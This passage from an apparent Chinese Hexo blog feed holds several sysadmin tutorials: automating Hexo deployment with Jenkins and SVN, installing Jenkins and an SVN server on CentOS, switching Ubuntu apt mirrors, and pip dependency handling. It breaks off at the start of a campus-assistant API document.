    <content type="html"><![CDATA[<p>起由：hexo是一个很好用的轻量级博客系统，生成纯静态相对安全而且高性能，但是每次写完博文都需要手动生成静态文件，部署到服务器，影响生活，于是就考虑使用jenkins实现自动部署。</p><span id="more"></span><h3 id="如果希望通过github的actions来实现，可以参考Hexo-Github-Actions-实现提交代码自动部署并通过FTP传到云服务器"><a href="#如果希望通过github的actions来实现，可以参考Hexo-Github-Actions-实现提交代码自动部署并通过FTP传到云服务器" class="headerlink" title="如果希望通过github的actions来实现，可以参考Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器"></a>如果希望通过github的actions来实现，可以参考<a href="/2021/07/newpost-18/">Hexo + Github Actions 实现提交代码自动部署并通过FTP传到云服务器</a></h3><h2 id="一、前提"><a href="#一、前提" class="headerlink" title="一、前提"></a>一、前提</h2><p>会用<a href="/2017/12/post233/">hexo</a>、<a href="/2020/11/post246/">svn</a>，拥有自己的服务器，安装好<a href="/2020/11/post247/">jenkins</a>，并把hexo目录中文件同步到svn，其中<code>db.json</code>、<code>public/</code>、<code>node_modules/</code>无需上传，本文假设你已经把它上传到<code>svn://xxx.cn/hexo</code>，svn账号密码都为<code>admin</code>。</p><h2 id="二、准备"><a href="#二、准备" class="headerlink" title="二、准备"></a>二、准备</h2><h3 id="1-系统安装node-js"><a href="#1-系统安装node-js" class="headerlink" title="1.系统安装node.js"></a>1.系统安装<a href="https://nodejs.org/zh-cn/download/">node.js</a></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home<br><span class="hljs-built_in">mkdir</span> node<br><span class="hljs-built_in">cd</span> /node<br>wget https://nodejs.org/dist/v14.15.0/node-v14.15.0-linux-x64.tar.xz<br>tar -xf node-v14.15.0-linux-x64.tar.xz<br><span class="hljs-built_in">cd</span> node-v14.15.0-linux-x64<br><span class="hljs-built_in">ln</span> -s /home/node/node-v14.15.0-linux-x64/bin/node /usr/local/bin/<br><span class="hljs-built_in">ln</span> -s /home/node/node-v14.15.0-linux-x64/bin/npm /usr/local/bin/<br></code></pre></td></tr></table></figure><h3 id="2-安装hexo"><a href="#2-安装hexo" class="headerlink" title="2.安装hexo"></a>2.安装hexo</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install hexo-cli -g<br></code></pre></td></tr></table></figure><h3 id="3-配置环境变量"><a href="#3-配置环境变量" class="headerlink" title="3.配置环境变量"></a>3.配置环境变量</h3><p>参考<a href="/2020/11/post248/">这篇博文</a></p><h2 id="三、jenkins配置"><a href="#三、jenkins配置" class="headerlink" title="三、jenkins配置"></a>三、jenkins配置</h2><ul><li><p>登录到jenkins，进入系统管理-插件管理，点击可选插件，搜索SVN，找到<a href="https://plugins.jenkins.io/svncompat14">SVN 1.4 Compatibility Plugin</a>并安装。</p></li><li><p>点击右上角用户的下拉，点击凭据，如图</p><img src="/2020/11/post249/249-2.png" class="" title="249-2"></li><li><p>点击域-全局下拉-添加凭据，如图</p><img src="/2020/11/post249/249-3.png" class="" title="249-3"></li><li><p>输入SVN账号，密码，ID(自己造)和描述，点击确定，如图</p><img src="/2020/11/post249/249-4.png" class="" title="249-4"></li><li><p>进入jenkins首页，左上角新建任务，输入任务名，选择构建自由风格项目，点击确定，如图</p></li></ul><img src="/2020/11/post249/249-1.png" class="" title="249-1"><ul><li>确定后会进入配置页面，输入描述，例如hexo自动构建，勾选<code>丢弃旧的构建</code>，<code>保持构建的最大个数</code>建议输入10，<code>源码管理</code>选<code>Subversion</code>，然后输入svn地址、选择svn账号，如图</li></ul><img src="/2020/11/post249/249-5.png" class="" title="249-5"><ul><li><p><code>构建</code>中点击<code>增加构建步骤</code>，点击<code>执行shell</code>，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">rm</span> -rf ./hexo.zip <span class="hljs-comment">#如果不需要归档，则删除此行</span><br>npm install --unsafe-perm<br>hexo clean<br>hexo g<br><span class="hljs-built_in">cd</span> public <span class="hljs-comment">#如果不需要归档，则删除此行</span><br>zip -r ../hexo.zip ./* <span class="hljs-comment">#如果不需要归档，则删除此行</span><br></code></pre></td></tr></table></figure></li><li><p>（可选归档）<code>构建后操作</code>中<code>增加构建后操作步骤</code>，点击<code>归档成品</code>，<code>用于存档的文件</code>输入<code>hexo.zip</code>。</p></li><li><p>保存后进入刚创建的任务，点击<code>立即构建</code>，进入<code>构建历史</code>中找到正在构建的任务，点进去查看<code>控制台输出</code>，如果最后返回<code>Finished: SUCCESS</code>则说明构建成功。</p></li><li><p>构建的<code>控制台输出</code>开头会告诉你构建位置，如图，可知构建在<code>/var/lib/jenkins/workspace/blog</code></p></li></ul><img src="/2020/11/post249/249-6.png" class="" title="249-6"><ul><li>将nginx指向<code>/var/lib/jenkins/workspace/blog/public</code>，打开nginx中配置的链接即可访问博客。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>持续集成</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos中jenkins配置环境变量</title>
    <link href="/2020/11/post248/"/>
    <url>/2020/11/post248/</url>
    
    <content type="html"><![CDATA[<p>起由：在Jenkins配置脚本期望执行npm命令，但实际没有执行，也没有报错</p><span id="more"></span><h3 id="1-获取系统环境变量"><a href="#1-获取系统环境变量" class="headerlink" title="1.获取系统环境变量"></a>1.获取系统环境变量</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>得到如下，复制它</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/root/</span>.pyenv<span class="hljs-regexp">/shims:/</span>root<span class="hljs-regexp">/.pyenv/</span>bin:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/sbin:/u</span>sr<span class="hljs-regexp">/local/</span>bin:<span class="hljs-regexp">/usr/</span>sbin:<span class="hljs-regexp">/usr/</span>bin:<span class="hljs-regexp">/root/</span>bin<br></code></pre></td></tr></table></figure><h3 id="2-配置jenkins"><a href="#2-配置jenkins" class="headerlink" title="2.配置jenkins"></a>2.配置jenkins</h3><p>系统管理-系统配置-全局属性-环境变量-新增-粘贴-保存<br>如图</p><img src="/2020/11/post248/248-1.png" class="" title="248-1">]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>持续集成</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos安装jenkins</title>
    <link href="/2020/11/post247/"/>
    <url>/2020/11/post247/</url>
    
    <content type="html"><![CDATA[<h2 id="一、安装jdk"><a href="#一、安装jdk" class="headerlink" title="一、安装jdk"></a>一、安装jdk</h2><p>首先确认系统是否安装jdk环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -version<br></code></pre></td></tr></table></figure><span id="more"></span><p>如果没安装会提示你<code>command not found</code>，使用下边的命令安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y java<br></code></pre></td></tr></table></figure><h2 id="二、安装jenkins"><a href="#二、安装jenkins" class="headerlink" title="二、安装jenkins"></a>二、安装jenkins</h2><h3 id="1-添加Jenkins库到yum库并配置key，可以到-jenkins官网-获取最新库和key"><a href="#1-添加Jenkins库到yum库并配置key，可以到-jenkins官网-获取最新库和key" class="headerlink" title="1.添加Jenkins库到yum库并配置key，可以到 jenkins官网 获取最新库和key"></a>1.添加Jenkins库到yum库并配置key，可以到 <a href="https://pkg.jenkins.io/redhat-stable/">jenkins官网</a> 获取最新库和key</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> wget -O /etc/yum.repos.d/jenkins.repo https://pkg.jenkins.io/redhat-stable/jenkins.repo<br><span class="hljs-built_in">sudo</span> rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key<br></code></pre></td></tr></table></figure><h3 id="2-安装jenkins"><a href="#2-安装jenkins" class="headerlink" title="2.安装jenkins"></a>2.安装jenkins</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install jenkins<br></code></pre></td></tr></table></figure><h3 id="3-修改jenkins默认端口号"><a href="#3-修改jenkins默认端口号" class="headerlink" title="3.修改jenkins默认端口号"></a>3.修改jenkins默认端口号</h3><p>jenkins默认端口号8080，如果要修改请</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/sysconfig/jenkins<br></code></pre></td></tr></table></figure><p>找到<code>JENKINS_PORT=&quot;8080&quot;</code>修改即可</p><h3 id="4-启动jenkins"><a href="#4-启动jenkins" class="headerlink" title="4.启动jenkins"></a>4.启动jenkins</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service jenkins start<br></code></pre></td></tr></table></figure><ul><li>停止和重启分别用下边的命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">service jenkins stop <span class="hljs-comment">#停止</span><br>service jenkins restart <span class="hljs-comment">#重启</span><br></code></pre></td></tr></table></figure><ul><li>安装成功后Jenkins将作为一个守护进程随系统启动</li></ul><h3 id="5-打开jenkins"><a href="#5-打开jenkins" class="headerlink" title="5.打开jenkins"></a>5.打开jenkins</h3><p>浏览器输入服务器地址加上端口号，例如<code>http://190.168.1.2:8080/</code></p><p>首次打开会让你输入密码，密码在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /var/lib/jenkins/secrets/initialAdminPassword<br></code></pre></td></tr></table></figure><p>复制进去即可</p><p>之后可以默认安装推荐插件，配置用户名密码，安装完成。</p><h3 id="6-更新jenkins"><a href="#6-更新jenkins" class="headerlink" title="6.更新jenkins"></a>6.更新jenkins</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum update jenkins<br></code></pre></td></tr></table></figure><p>这种方式可能无法更新到最新的jenkins，需要手动在磁盘查找<code>jenkins.war</code>并替换</p><ul><li><p>停止jenkins<code>service jenkins stop</code></p></li><li><p><code>rpm -ql jenkins</code>找到<code>jenkins.war</code>，然后官网下载最新的替换</p></li><li><p>启动jenkins<code>service jenkins start</code></p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>持续集成</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos安装svn服务器</title>
    <link href="/2020/11/post246/"/>
    <url>/2020/11/post246/</url>
    
    <content type="html"><![CDATA[<h2 id="一、安装svn"><a href="#一、安装svn" class="headerlink" title="一、安装svn"></a>一、安装svn</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum install subversion<br></code></pre></td></tr></table></figure><span id="more"></span><h2 id="二、建立版本库"><a href="#二、建立版本库" class="headerlink" title="二、建立版本库"></a>二、建立版本库</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /home/svn<br><span class="hljs-built_in">mkdir</span> project<br>svnadmin create /home/svn/project<br></code></pre></td></tr></table></figure><h2 id="三、控制权限、目录，启动"><a href="#三、控制权限、目录，启动" class="headerlink" title="三、控制权限、目录，启动"></a>三、控制权限、目录，启动</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /home/svn/project/conf<br></code></pre></td></tr></table></figure><p>authz 是权限控制文件 passwd 是帐号密码文件 svnserve.conf 是SVN服务配置文件</p><h3 id="1-authz文件如下，username改为你的用户名"><a href="#1-authz文件如下，username改为你的用户名" class="headerlink" title="1.authz文件如下，username改为你的用户名"></a>1.authz文件如下，<code>username</code>改为你的用户名</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[/]</span><br><span class="hljs-attr">username</span> = rw<br></code></pre></td></tr></table></figure><p>可以添加多条，如</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[/project1]</span><br><span class="hljs-attr">username1</span> = rw<br></code></pre></td></tr></table></figure><h3 id="2-passwd文件如下，username改为你的用户名，password改为密码，不用引号"><a href="#2-passwd文件如下，username改为你的用户名，password改为密码，不用引号" class="headerlink" title="2.passwd文件如下，username改为你的用户名，password改为密码，不用引号"></a>2.passwd文件如下，<code>username</code>改为你的用户名，password改为密码，不用引号</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[users]</span><br><span class="hljs-attr">username</span> = password<br><span class="hljs-attr">username1</span> = password1<br></code></pre></td></tr></table></figure><h3 id="3-svnserve-conf文件如下"><a href="#3-svnserve-conf文件如下" class="headerlink" title="3.svnserve.conf文件如下"></a>3.svnserve.conf文件如下</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[general]</span><br><span class="hljs-attr">anon-access</span> = none<br><span class="hljs-attr">auth-access</span> = write<br><span class="hljs-attr">password-db</span> = passwd<br><span class="hljs-attr">authz-db</span> = authz<br></code></pre></td></tr></table></figure><h3 id="4-启动svn"><a href="#4-启动svn" class="headerlink" title="4.启动svn"></a>4.启动svn</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">svnserve -d -r /home/svn/project/<br></code></pre></td></tr></table></figure><h2 id="四、连接到SVN"><a href="#四、连接到SVN" class="headerlink" title="四、连接到SVN"></a>四、连接到SVN</h2><p>安装诸如<code>svn小乌龟</code>之类的工具，连接到你的服务器ip加上<code>authz</code>文件中中括号内的路径，例如<code>svn://192.168.1.2/project1</code>，账号为<code>authz</code>文件中配置的账号<code>username1</code>，密码为<code>passwd</code>文件中配置的<code>password1</code></p><h2 id="五、重启SVN"><a href="#五、重启SVN" class="headerlink" title="五、重启SVN"></a>五、重启SVN</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">killall svnserve<br>svnserve -d -r /home/svn/project/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu 20.04 换国内源</title>
    <link href="/2020/11/post245/"/>
    <url>/2020/11/post245/</url>
    
    <content type="html"><![CDATA[<p>编辑 <code>/etc/apt/sources.list</code></p><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> vim /etc/apt/sources.list<br></code></pre></td></tr></table></figure><h3 id="清华源"><a href="#清华源" class="headerlink" title="清华源"></a>清华源</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span><br>deb https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="hljs-meta"># deb-src https:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br>deb https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="hljs-meta"># deb-src https:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br>deb https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="hljs-meta"># deb-src https:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br>deb https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="hljs-meta"># deb-src https:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br><br><span class="hljs-meta"># 预发布软件源，不建议启用</span><br><span class="hljs-meta"># deb https:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br><span class="hljs-meta"># deb-src https:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span></span><br></code></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt upgrade<br></code></pre></td></tr></table></figure><h3 id="其他源"><a href="#其他源" class="headerlink" title="其他源"></a>其他源</h3><ul><li>阿里  </li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br>deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br>deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br>deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br>deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></code></pre></td></tr></table></figure><ul><li>中科大</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">deb https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br>deb https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br>deb https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br>deb https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br>deb https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src https<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</span><br></code></pre></td></tr></table></figure><ul><li>网易163</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs 1c">deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal main restricted universe multiverse</span><br>deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse</span><br>deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse</span><br>deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br>deb http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br>deb<span class="hljs-punctuation">-</span>src http<span class="hljs-punctuation">:</span><span class="hljs-comment">//mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vs Code编写md文件实现实时预览</title>
    <link href="/2020/10/post244/"/>
    <url>/2020/10/post244/</url>
    
    <content type="html"><![CDATA[<p>使用组合键Ctrl + Shift + P，打开命令窗口，输入mark，点击即可在右边实时预览，如图</p><span id="more"></span><img src="/2020/10/post244/1.png" class="" title="1.png">]]></content>
    
    
    
    <tags>
      
      <tag>经验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python自动处理依赖</title>
    <link href="/2019/11/post243/"/>
    <url>/2019/11/post243/</url>
    
    <content type="html"><![CDATA[<h3 id="一、起由"><a href="#一、起由" class="headerlink" title="一、起由"></a>一、起由</h3><p>python项目常常引入众多包，当更换环境时一个个导入太麻烦，而且有导入错版本导致不兼容的可能，本文提供了一种常用的方法自动处理python依赖。</p><span id="more"></span><h3 id="二、生成依赖（以下操作需要先cmd到项目根目录）"><a href="#二、生成依赖（以下操作需要先cmd到项目根目录）" class="headerlink" title="二、生成依赖（以下操作需要先cmd到项目根目录）"></a>二、生成依赖（以下操作需要先cmd到项目根目录）</h3><h4 id="1-生成当前python环境所有依赖"><a href="#1-生成当前python环境所有依赖" class="headerlink" title="1.生成当前python环境所有依赖"></a>1.生成当前python环境所有依赖</h4><p>一条命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip freeze &gt; requirements.txt<br></code></pre></td></tr></table></figure><h4 id="2-只生成当前项目所所需依赖"><a href="#2-只生成当前项目所所需依赖" class="headerlink" title="2.只生成当前项目所所需依赖"></a>2.只生成当前项目所所需依赖</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install pipreqs<br>pipreqs ./<br></code></pre></td></tr></table></figure><p>如果报编码错误那么强制使用utf-8</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pipreqs ./ --encoding=utf-8<br></code></pre></td></tr></table></figure><h3 id="三、安装依赖"><a href="#三、安装依赖" class="headerlink" title="三、安装依赖"></a>三、安装依赖</h3><p>一条命令即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install -r requirements.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>海滨校园助手api使用文档</title>
    <link href="/2018/06/post242/"/>
    <url>/2018/06/post242/</url>
    
    <content type="html"><![CDATA[<h3 id="公共接口"><a href="#公共接口" class="headerlink" title="公共接口"></a>公共接口</h3><p>公共接口面向所有组织及个人开放，开发者可以凭借用户授权秘钥确认用户身份，以及获取用户姓名班级等信息。</p><span id="more"></span><p>1.公共接口调用链接为：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//hbscher.ctftools.com/pubapi?safekey=xxxxx</span><br></code></pre></td></tr></table></figure><p>将其中的<code>xxxxx</code>改成对应的秘钥即可，授权秘钥只能使用一次，用完即失效</p><p>2.返回数据样式：</p><ul><li>成功</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>    <span class="hljs-string">&quot;data&quot;</span>:[<br>        &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-comment">//用户在本平台的唯一身份码</span><br>            <span class="hljs-string">&quot;uid&quot;</span>:<span class="hljs-number">16853046</span>,<span class="hljs-comment">//用户学号</span><br>            <span class="hljs-string">&quot;uname&quot;</span>:<span class="hljs-string">&quot;王启航&quot;</span>,<span class="hljs-comment">//用户姓名</span><br>            <span class="hljs-string">&quot;grade&quot;</span>:<span class="hljs-string">&quot;16&quot;</span>,<span class="hljs-comment">//用户年级</span><br>            <span class="hljs-string">&quot;college&quot;</span>:<span class="hljs-string">&quot;计算机与信息技术学院&quot;</span>,<span class="hljs-comment">//用户所在学院</span><br>            <span class="hljs-string">&quot;speciality&quot;</span>:<span class="hljs-string">&quot;物联网&quot;</span>,<span class="hljs-comment">//用户所在专业</span><br>            <span class="hljs-string">&quot;clazz&quot;</span>:<span class="hljs-string">&quot;物联网1601&quot;</span><span class="hljs-comment">//班级</span><br>        